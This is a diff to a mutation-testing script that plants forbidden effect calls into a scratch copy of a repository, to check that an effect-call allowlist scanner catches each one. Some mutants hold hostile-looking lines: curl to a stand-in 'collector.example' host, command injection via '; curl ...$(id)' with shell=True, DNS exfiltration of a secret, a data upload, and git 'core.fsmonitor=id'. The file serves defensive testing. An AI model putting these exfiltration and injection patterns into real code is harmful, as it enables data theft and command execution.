@@ -1,11 +1,17 @@
-"""The effect-call allowlist (MU-D) must fail on every way an unreviewed effect can enter greg/ or foundry/systems/.
+"""The effect-call allowlist (MU-D) must fail on every way an unreviewed effect can enter greg/, foundry/systems/ or
+a repository module they import.
 
 Each mutant edits a scratch copy of the tree: source modules (a new effect call, an aliased, re-exported, rebound or
 star import, a call moved into a new function, an extra occurrence, an unchecked caller of a declared wrapper, an
-effect in an evaluated annotation, a listener, an httpx2 client), the allowlist (an entry removed, a stale or
-miscounted entry, an unknown capability, a wrapper undeclared or mis-declared, a body-loop finding filed as an
-approval), or the scanner itself (so its self-tests stay load-bearing). A mutant is CAUGHT only when the named test
-fails and its output names the expected site.
+effect in an evaluated annotation, a listener, an httpx2 client, an effect module used as a value, a TLS dial, a
+connecting urllib handler, a name lookup, a stdlib call that spawns on PATH, a rewritten known_unmediated spawn or a
+constant it reads, an effect in an imported module outside greg/, code run from a string, a context that spawns, a
+loop method on a named receiver, a new or widened program lookup, a rewritten allowed call or a constant it reads),
+the allowlist (an entry removed, a stale or miscounted entry, an unknown capability, a wrapper undeclared or
+mis-declared, a body-loop finding filed as an approval or re-filed with a person-run serves, a pin dropped or stale,
+a lookup removed or misstated, an envelope claim that hides the ambient PATH), or the scanner itself (so its
+self-tests stay load-bearing). A mutant is CAUGHT only when the named test fails and its output names the expected
+site.
 
     python scripts/ci/check_effect_call_allowlist_mutants.py
 """
@@ -21,8 +27,26 @@ QUIET = f"{TEST}::test_what_is_not_an_effect_is_not_listed"
 NAMES = f"{TEST}::test_names_are_followed_across_scanned_modules"
 WRAPS = f"{TEST}::test_declared_wrappers_are_listed_at_each_caller"
 STARS = f"{TEST}::test_a_star_import_fails_and_cannot_be_listed"
+MODULES = f"{TEST}::test_an_effect_module_used_as_a_value_and_the_added_callees_are_sites"
+PINS = f"{TEST}::test_a_known_unmediated_pin_binds_its_reason_to_the_code"
+CALL_PINS = f"{TEST}::test_an_allowed_pin_binds_its_justification_to_the_calls"
+FINDING = f"{TEST}::test_a_finding_cannot_be_refiled_as_an_approval"
+ROUND3 = f"{TEST}::test_the_round_three_forms_are_sites"
+LOOKUPS = f"{TEST}::test_program_lookups_record_what_they_search"
+ENVELOPE = f"{TEST}::test_an_envelope_claim_names_the_ambient_path"
+IMPORTS = f"{TEST}::test_the_scan_follows_imports_into_the_repository"
+ROOTS = f"{TEST}::test_sys_path_roots_are_module_roots"
 SYSCTL = 'out = subprocess.run(["/usr/sbin/sysctl", "-n", "hw.memsize"], capture_output=True, text=True, timeout=5)'
+DPKG = ('        proc = subprocess.run([dpkg, "-S", real], capture_output=True, text=True, timeout=DPKG_TIMEOUT,\n'
+        '                              env={"PATH": "/usr/bin:/bin", "LC_ALL": "C"})')
 UNLISTED = "UNLISTED effect call site "
+PIN = "PIN MISMATCH known_unmediated "
+CANONICAL = 'text = "\\n".join(_canonical(node) for node in (definition, *constants))'
+CALLS = 'text = "\\n".join(sorted(_canonical(node) for node in nodes)) + "\\n--\\n" + "\\n".join(map(_canonical, constants))'
+ALLOWED_PIN = "PIN MISMATCH allowed "
+# The two pin comparisons, each with the line after it so the anchor occurs once.
+KNOWN_PIN_CHECK = '        if entry.get("pin") != digest:\n            reads = f" or a top-level constant it reads'
+ALLOWED_PIN_CHECK = '        if entry.get("pin") != digest:\n            reads = f" and the top-level constants they read'
 
 
 def append(text):
@@ -70,15 +94,39 @@ def entry(module, qualname, change, section="allowed"):
     return edit
 
 
-def move_to_allowed(module, qualname):
+def move_to_allowed(module, qualname, serves=None):
+    """A known_unmediated entry re-filed under allowed, keeping its pin; with ``serves`` its body-loop serves are
+    replaced by a person-run one, the realistic re-filing the malformed check alone cannot see."""
     def edit(document):
         found = [e for e in document["known_unmediated"] if (e["module"], e["qualname"]) == (module, qualname)]
         if len(found) != 1:
             raise LookupError(f"no known_unmediated entry {module} :: {qualname}")
         document["known_unmediated"].remove(found[0])
-        moved = {**found[0], "justification": found[0]["reason"]}
+        moved = {**found[0], "justification": found[0]["reason"], **({"serves": serves} if serves else {})}
         del moved["reason"]
         document["allowed"].append(moved)
+    return edit
+
+
+def move_to_unmediated(module, qualname):
+    def edit(document):
+        found = [e for e in document["allowed"] if (e["module"], e["qualname"]) == (module, qualname)]
+        if len(found) != 1:
+            raise LookupError(f"no allowed entry {module} :: {qualname}")
+        document["allowed"].remove(found[0])
+        moved = {**found[0], "reason": found[0]["justification"], "serves": ["body-loop:Body.tick"]}
+        del moved["justification"]
+        document["known_unmediated"].append(moved)
+    return edit
+
+
+def lookup(module, qualname, program, change):
+    def edit(document):
+        for e in document["path_lookups"]:
+            if (e["module"], e["qualname"], e["program"]) == (module, qualname, program):
+                change(document, e)
+                return
+        raise LookupError(f"no path lookup {module} :: {qualname} :: {program}")
     return edit
 
 
@@ -178,6 +226,94 @@ MUTANTS = [
      append("\n\ndef _mutant_open_network(argv, cwd):\n    from greg.capabilities import run_isolated\n"
             "    return run_isolated(argv, cwd=cwd, isolate_network=False)\n")),
      TREE, UNLISTED + "greg/briefs.py :: _mutant_open_network :: greg.capabilities.run_isolated"),
+    ("module object stored on an attribute (self.sp = subprocess)", one("greg/compute.py",
+     append('\n\nclass _MutantRunner:\n    def __init__(self):\n        self.sp = subprocess\n\n'
+            '    def go(self):\n        return self.sp.run(["curl", "https://collector.example"])\n')),
+     TREE, UNLISTED + "greg/compute.py :: _MutantRunner.__init__ :: subprocess (1 module reference)"),
+    ("module as an injected default (sp=subprocess)", one("greg/compute.py",
+     append('\n\ndef _mutant_module_default(argv, sp=subprocess):\n    return sp.run(argv)\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_module_default :: subprocess (1 module reference)"),
+    ("module passed as an argument (vars(subprocess)[...])", one("greg/compute.py",
+     append('\n\ndef _mutant_vars():\n    return vars(subprocess)["run"](["true"])\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_vars :: subprocess (1 module reference)"),
+    ("module namespace (subprocess.__dict__[...])", one("greg/compute.py",
+     append('\n\ndef _mutant_namespace():\n    return subprocess.__dict__["Popen"](["true"])\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_namespace :: subprocess (1 module reference)"),
+    ("module as a class attribute (host = os), read as self.host", one("greg/compute.py",
+     append('\n\nclass _MutantHost:\n    host = os\n\n    def go(self):\n        return self.host.system("true")\n')),
+     TREE, UNLISTED + "greg/compute.py :: _MutantHost :: os (1 module reference)"),
+    ("ssl.create_connection", one("greg/compute.py",
+     append('\n\ndef _mutant_tls():\n    import ssl\n    return ssl.create_connection(("collector.example", 443))\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_tls :: ssl.create_connection"),
+    ("urllib.request handler that connects", one("greg/briefs.py",
+     append("\n\ndef _mutant_handler(req):\n    return urllib.request.HTTPSHandler().https_open(req)\n")),
+     TREE, UNLISTED + "greg/briefs.py :: _mutant_handler :: urllib.request.HTTPSHandler"),
+    ("name lookup carrying data (socket.getaddrinfo)", one("greg/compute.py",
+     append('\n\ndef _mutant_dns(secret):\n    import socket\n'
+            '    return socket.getaddrinfo(secret + ".collector.example", 443)\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_dns :: socket.getaddrinfo"),
+    ("stdlib call that spawns uname on PATH (platform.processor)", one("greg/compute.py",
+     append('\n\ndef _mutant_processor():\n    return platform.processor()\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_processor :: platform.processor"),
+    ("second spawn in system_binary through a module attribute", one("greg/licensing.py",
+     replace((DPKG, DPKG + '\n        holder = type("H", (), {})()\n        holder.sp = subprocess\n'
+                           '        holder.sp.run(["sh", "-c", "id"])'))),
+     TREE, UNLISTED + "greg/licensing.py :: system_binary :: subprocess (1 module reference)"),
+    ("known_unmediated spawn rewritten (shell=True, inherited env, no timeout)", one("greg/licensing.py",
+     replace((DPKG, ('        proc = subprocess.run("dpkg-query -S " + real\n'
+                     '                              + "; curl -s https://collector.example/$(id)",\n'
+                     '                              shell=True, capture_output=True, text=True)')))),
+     TREE, PIN + "greg/licensing.py :: system_binary :: subprocess.run"),
+    ("constant a known_unmediated reason states changes (DPKG_TIMEOUT = 500)", one("greg/licensing.py",
+     replace(("DPKG_TIMEOUT = 5\n", "DPKG_TIMEOUT = 500\n"))),
+     TREE, PIN + "greg/licensing.py :: system_binary :: subprocess.run"),
+    ("draft P4c binary policy activated (requalify_binary goes live)", one("greg/licensing.py",
+     replace(('ACTIVE_BINARY_POLICY = "P0"', 'ACTIVE_BINARY_POLICY = "P4c"'))),
+     TREE, PIN + "greg/licensing.py :: requalify_binary :: greg.licensing.system_binary"),
+    ("new caller of licensing.system_binary", one("greg/presentation.py",
+     append("\n\ndef _mutant_new_reach(path):\n    from greg import licensing\n"
+            "    return licensing.system_binary(path)\n")),
+     TREE, UNLISTED + "greg/presentation.py :: _mutant_new_reach :: greg.licensing.system_binary"),
+    ("new caller of egregore.repository_audit.git_read", one("greg/presentation.py",
+     append("\n\ndef _mutant_git(path):\n    from egregore.repository_audit import git_read\n"
+            "    return git_read(path, '-c', 'core.fsmonitor=id', 'status')\n")),
+     TREE, UNLISTED + "greg/presentation.py :: _mutant_git :: egregore.repository_audit.git_read"),
+    ("new effect in an imported module outside greg/ (egregore)", one("egregore/repository_audit.py",
+     append("\n\ndef _mutant_upload(data):\n    import urllib.request\n"
+            "    return urllib.request.urlopen('https://collector.example', data)\n")),
+     TREE, UNLISTED + "egregore/repository_audit.py :: _mutant_upload :: urllib.request.urlopen"),
+    ("new repository module reached only through an import", [
+        ("egregore/_mutant_helper.py", write("import socket\n\n\ndef dial():\n"
+                                             "    return socket.create_connection(('collector.example', 443))\n")),
+        ("greg/compute.py", append("\n\nfrom egregore import _mutant_helper  # noqa: E402,F401\n"))],
+     TREE, UNLISTED + "egregore/_mutant_helper.py :: dial :: socket.create_connection"),
+    ("new effect in the module loaded from tools/ (offline_test)", one("tools/offline_test.py",
+     append("\n\ndef _mutant_tool():\n    return os.system('id')\n")),
+     TREE, UNLISTED + "tools/offline_test.py :: _mutant_tool :: os.system"),
+    ("code run from a string (exec of a literal)", one("greg/compute.py",
+     append("\n\ndef _mutant_exec():\n    exec(\"import subprocess; subprocess.run(['id'])\")\n")),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_exec :: builtins.exec"),
+    ("a context whose Process spawns (multiprocessing.get_context)", one("greg/compute.py",
+     append('\n\ndef _mutant_context():\n    import multiprocessing\n'
+            '    return multiprocessing.get_context("spawn").Process(target=print).start()\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_context :: multiprocessing.get_context"),
+    ("loop method on a class attribute (C.loop.subprocess_exec)", one("greg/compute.py",
+     append('\n\nclass _MutantLoop:\n    loop = None\n\n\ndef _mutant_loop(handler):\n'
+            '    return _MutantLoop.loop.subprocess_exec(handler, "id")\n')),
+     TREE, UNLISTED + "greg/compute.py :: _mutant_loop :: asyncio.AbstractEventLoop.subprocess_exec"),
+    ("new program lookup on the ambient PATH", one("greg/compute.py",
+     append('\n\ndef _mutant_which():\n    import shutil\n    return shutil.which("curl")\n')),
+     TREE, "UNLISTED path lookup greg/compute.py :: _mutant_which :: curl"),
+    ("pinned git lookup moved to the ambient PATH (env dropped)", one("greg/organs.py",
+     replace(('                             timeout=10, env={"PATH": "/usr/bin:/bin", "GIT_CONFIG_NOSYSTEM": "1"})',
+              '                             timeout=10)'))),
+     TREE, "SEARCHES MISMATCH path lookup greg/organs.py :: _head :: git"),
+    ("allowed call rewritten (systemctl show-environment -> start)", one("greg/doctor.py",
+     replace(('["systemctl", "--user", "show-environment"]', '["systemctl", "--user", "start", "greg"]'))),
+     TREE, ALLOWED_PIN + "greg/doctor.py :: chromebook :: subprocess.run"),
+    ("constant an allowed call reads changes (CI_TIMEOUT = 120000)", one("foundry/systems/commissioning.py",
+     replace(("CI_TIMEOUT = 120\n", "CI_TIMEOUT = 120000\n"))),
+     TREE, ALLOWED_PIN + "foundry/systems/commissioning.py :: Commission._ci :: subprocess.run"),
     # -- the allowlist loses or misstates an entry --------------------------------------------------------
     ("allowed entry removed", one(ALLOWLIST, allowlist(drop("allowed", "greg/egress.py", "send"))),
      TREE, UNLISTED + "greg/egress.py :: send :: urllib.request.build_opener().open"),
@@ -192,7 +328,8 @@ MUTANTS = [
      TREE, UNLISTED + "greg/licensing.py :: system_binary :: subprocess.run"),
     ("body-loop finding filed as an approval", one(ALLOWLIST, allowlist(move_to_allowed("greg/compute.py", "memory_bytes"))),
      FORMED, "belongs under known_unmediated"),
-    ("stale entry", one(ALLOWLIST, allowlist(lambda d: d["allowed"].append({**d["allowed"][0], "qualname": "gone"}))),
+    ("stale entry", one(ALLOWLIST, allowlist(lambda d: d["allowed"].append(
+        {**next(e for e in d["allowed"] if e["module"] == "foundry/systems/build.py"), "qualname": "gone"}))),
      TREE, "STALE allowed entry foundry/systems/build.py :: gone :: subprocess.run"),
     ("wrong count", one(ALLOWLIST, allowlist(entry("greg/organs.py", "_snapshot", lambda e: e.update(count=2)))),
      TREE, "COUNT MISMATCH greg/organs.py :: _snapshot :: subprocess.run"),
@@ -208,6 +345,52 @@ MUTANTS = [
     ("wrapper exemption misstated (isolate_network=False)", one(ALLOWLIST,
      allowlist(wrapper("run_isolated", lambda d, w: w.update(exempt_when={"isolate_network": False})))),
      TREE, "exempt_when isolate_network=False needs a keyword-only parameter"),
+    ("known_unmediated entry removed (_binary_license)", one(ALLOWLIST,
+     allowlist(drop("known_unmediated", "greg/genesis.py", "_binary_license"))),
+     TREE, UNLISTED + "greg/genesis.py :: _binary_license :: greg.licensing.system_binary"),
+    ("known_unmediated entry removed (requalify_binary)", one(ALLOWLIST,
+     allowlist(drop("known_unmediated", "greg/licensing.py", "requalify_binary"))),
+     TREE, UNLISTED + "greg/licensing.py :: requalify_binary :: greg.licensing.system_binary"),
+    ("wrapper undeclared (greg.licensing.system_binary)", one(ALLOWLIST,
+     allowlist(wrapper("system_binary", lambda d, w: d["wrappers"].remove(w)))),
+     TREE, "STALE known_unmediated entry greg/genesis.py :: _binary_license :: greg.licensing.system_binary"),
+    ("known_unmediated pin dropped", one(ALLOWLIST,
+     allowlist(entry("greg/compute.py", "memory_bytes", lambda e: e.pop("pin"), section="known_unmediated"))),
+     FORMED, "must have exactly the fields"),
+    ("known_unmediated pin stale", one(ALLOWLIST,
+     allowlist(entry("greg/compute.py", "memory_bytes", lambda e: e.update(pin="0" * 64), section="known_unmediated"))),
+     TREE, PIN + "greg/compute.py :: memory_bytes :: subprocess.run"),
+    ("finding re-filed as an approval with a person-run serves (system_binary)", one(ALLOWLIST,
+     allowlist(move_to_allowed("greg/licensing.py", "system_binary", serves=["operator:greg status"]))),
+     TREE, "FINDING RE-FILED greg/licensing.py :: system_binary :: subprocess.run"),
+    ("allowed site filed as a finding without FINDINGS", one(ALLOWLIST,
+     allowlist(move_to_unmediated("greg/doctor.py", "chromebook"))),
+     TREE, "NEW FINDING greg/doctor.py :: chromebook :: subprocess.run"),
+    ("known_unmediated entry removed (install_filter)", one(ALLOWLIST,
+     allowlist(drop("known_unmediated", "tools/offline_test.py", "install_filter"))),
+     TREE, UNLISTED + "tools/offline_test.py :: install_filter :: ctypes.util.find_library"),
+    ("wrapper undeclared (egregore.repository_audit.git_read)", one(ALLOWLIST,
+     allowlist(wrapper("git_read", lambda d, w: d["wrappers"].remove(w)))),
+     TREE, "STALE allowed entry greg/briefs.py :: _git :: egregore.repository_audit.git_read"),
+    ("allowed pin dropped", one(ALLOWLIST,
+     allowlist(entry("greg/ventures.py", "_git_head", lambda e: e.pop("pin")))),
+     FORMED, "must have exactly the fields"),
+    ("allowed pin stale", one(ALLOWLIST,
+     allowlist(entry("greg/ventures.py", "_git_head", lambda e: e.update(pin="0" * 64)))),
+     TREE, ALLOWED_PIN + "greg/ventures.py :: _git_head :: subprocess.run"),
+    ("path lookup removed (dpkg-query on the ambient PATH)", one(ALLOWLIST,
+     allowlist(lookup("greg/licensing.py", "system_binary", "dpkg-query",
+                      lambda d, e: d["path_lookups"].remove(e)))),
+     TREE, "UNLISTED path lookup greg/licensing.py :: system_binary :: dpkg-query"),
+    ("path lookup misstated (bwrap said to search /usr/bin:/bin)", one(ALLOWLIST,
+     allowlist(lookup("greg/worker_isolation.py", "_backend", "bwrap",
+                      lambda d, e: e.update(searches="/usr/bin:/bin")))),
+     TREE, "SEARCHES MISMATCH path lookup greg/worker_isolation.py :: _backend :: bwrap"),
+    ("envelope claim that hides the ambient PATH (_backend's round-2 text)", one(ALLOWLIST,
+     allowlist(entry("greg/worker_isolation.py", "_backend", lambda e: e.update(
+         justification="probe: /usr/bin/true inside the bubblewrap envelope, to learn whether workers and "
+                       "namespaced capabilities can be confined; nothing else runs")))),
+     TREE, "ENVELOPE CLAIM allowed greg/worker_isolation.py :: _backend :: subprocess.run"),
     # -- the scanner itself is weakened -------------------------------------------------------------------
     ("scanner ignores `import x as y`", one(TEST,
      replace(("self.names[alias.asname].add(alias.name)", "pass"))), FORMS, "subprocess"),
@@ -228,7 +411,7 @@ MUTANTS = [
      replace(('if isinstance(literal, str) and "sys.modules" in self.resolve(node.value):', "if False:"))),
      FORMS, "subprocess.run"),
     ("scanner allows star imports", one(TEST,
-     replace(('self._record(qual, f"{base}.*", "star-import")', "pass"))), STARS, "subprocess.*"),
+     replace(('self._record(qual, f"{base}.*", "star-import", node)', "pass"))), STARS, "subprocess.*"),
     ("scanner ignores declared wrappers", one(TEST,
      replace(("if name in self.index.wrappers:", "if False:"))), WRAPS, "greg.egress.send"),
     ("scanner treats every wrapper call as exempt", one(TEST,
@@ -257,6 +440,76 @@ MUTANTS = [
     ("scanner drops inbound listeners", one(TEST,
      replace(('"http.server.ThreadingHTTPServer", *(f"socketserver.{server}"', '*(f"socketserver.{server}"'))),
      FORMS, "ThreadingHTTPServer"),
+    ("scanner ignores module references", one(TEST,
+     replace(("if not typed and id(node) not in self.followed:", "if False:"))), MODULES, "subprocess"),
+    ("scanner follows class-level names (host = os)", one(TEST,
+     replace((" \\\n                    or id(node) in in_class:", ":"))), MODULES, "Runner"),
+    ("scanner ignores a module's namespace (__dict__)", one(TEST,
+     replace(("if _hands_out_namespace(node.attr) and not typed:", "if False:"))), MODULES, "passed"),
+    ("scanner reads getattr(module, literal) as a module reference", one(TEST,
+     replace(("elif (module := self._module_read(node)) is not None:", "elif False:"))), QUIET, "'quiet', 'os'"),
+    ("scanner reports module references bound to plain names", one(TEST,
+     replace(("        return followed\n", "        return set()\n"))), FORMS, "subprocess"),
+    ("scanner drops name lookups", one(TEST,
+     replace(('    *(f"socket.{lookup}" for lookup in DNS_LOOKUPS),\n', ""))), MODULES, "getaddrinfo"),
+    ("scanner drops the stdlib calls that spawn on PATH", one(TEST,
+     replace(('"platform.platform", "platform.processor", "platform.architecture", "ctypes.util.find_library",', ""))),
+     MODULES, "platform"),
+    ("scanner drops the urllib handlers that connect", one(TEST,
+     replace(('"urllib.request.OpenerDirector", "urllib.request.HTTPHandler", "urllib.request.HTTPSHandler",',
+              '"urllib.request.OpenerDirector",'))), MODULES, "HTTPSHandler"),
+    ("pin ignores the constants a definition reads", one(TEST,
+     replace((CANONICAL, "text = _canonical(definition)"))), PINS, "!= digest for text in changed"),
+    ("pin compares source text, not parsed code", one(TEST,
+     replace((CANONICAL, ('text = "\\n".join(ast.get_source_segment(source, node) or "" for node in '
+                          '(definition, *constants))')))), PINS, "[digest] * 3"),
+    ("pin mismatch never reported", one(TEST,
+     replace((KNOWN_PIN_CHECK, KNOWN_PIN_CHECK.replace('entry.get("pin") != digest', "False")))),
+     PINS, "len(problems) == 1"),
+    ("any pin accepted as well formed", one(TEST,
+     replace(('re.fullmatch(r"[0-9a-f]{64}", entry["pin"])', "True"))), PINS, "pin must be the sha256 digest"),
+    ("allowed pin mismatch never reported", one(TEST,
+     replace((ALLOWED_PIN_CHECK, ALLOWED_PIN_CHECK.replace('entry.get("pin") != digest', "False")))),
+     CALL_PINS, "PIN MISMATCH allowed greg/p.py :: probe :: subprocess.run"),
+    ("allowed pin ignores the constants the calls read", one(TEST,
+     replace((CALLS, 'text = "\\n".join(sorted(_canonical(node) for node in nodes))'))),
+     CALL_PINS, "!= digest for text in changed"),
+    ("finding re-filing never reported", one(TEST,
+     replace(("for key in sorted(FINDINGS - filed)", "for key in sorted(set())"))), FINDING, "FINDING RE-FILED"),
+    ("loop methods only on a receiver the scan cannot name (round 3's rule)", one(TEST,
+     replace(("elif isinstance(func, ast.Attribute) and func.attr in LOOP_METHODS:",
+              "elif isinstance(func, ast.Attribute) and func.attr in LOOP_METHODS and not self.resolve(func.value):"),
+             ("            if node.attr in LOOP_METHODS:\n",
+              "            if node.attr in LOOP_METHODS and not self.resolve(node.value):\n"))),
+     ROUND3, "create_connection"),
+    ("scanner drops code run from a string", one(TEST,
+     replace(('"builtins.exec", "builtins.eval", "runpy.run_module", "runpy.run_path",',
+              '"runpy.run_module", "runpy.run_path",'))), ROUND3, "builtins.exec"),
+    ("a rebound builtin read as the builtin", one(TEST,
+     replace(("return isinstance(node, ast.Name) and node.id in names and node.id not in self.bound",
+              "return isinstance(node, ast.Name) and node.id in names"))), ROUND3, "subprocess.Popen"),
+    ("scanner drops the multiprocessing contexts and pools", one(TEST,
+     replace(('"multiprocessing.get_context", "multiprocessing.Manager", "multiprocessing.pool.Pool",',
+              '"multiprocessing.Manager",'))), ROUND3, "multiprocessing"),
+    ("scanner drops ssl.get_server_certificate", one(TEST,
+     replace(('"ssl.get_server_certificate", "telnetlib.Telnet",', '"telnetlib.Telnet",'))),
+     ROUND3, "get_server_certificate"),
+    ("scanner records no shutil.which lookups", one(TEST,
+     replace(('if "shutil.which" in names:', "if False:"))), LOOKUPS, "dpkg-query"),
+    ("lookups ignore the child's env", one(TEST,
+     replace(('searches = COMPUTED if wrapped and not callees & ARGV_FIRST else self._env_path(keywords.get("env"))',
+              "searches = AMBIENT"))), LOOKUPS, "/usr/bin:/bin"),
+    ("lookup searches mismatch never reported", one(TEST,
+     replace(('if entry["searches"] != searches:', "if False:"))), LOOKUPS, "SEARCHES MISMATCH"),
+    ("envelope claims never checked", one(TEST,
+     replace(("if any(word in text.lower() for word in ENVELOPE_WORDS) and AMBIENT not in text:", "if False:"))),
+     ENVELOPE, "ENVELOPE CLAIM"),
+    ("scanner stops following imports out of greg/", one(TEST,
+     replace(("        queue += [found for dotted in sorted(imported_names(relative, sources[relative]))",
+              "        queue += [] and [found for dotted in sorted(imported_names(relative, sources[relative]))"))),
+     IMPORTS, "helpers"),
+    ("tools/ dropped from the module roots", one(TEST,
+     replace(('MODULE_ROOTS = ("", "tools")', 'MODULE_ROOTS = ("",)'))), ROOTS, "MODULE_ROOTS"),
 ]
 
 
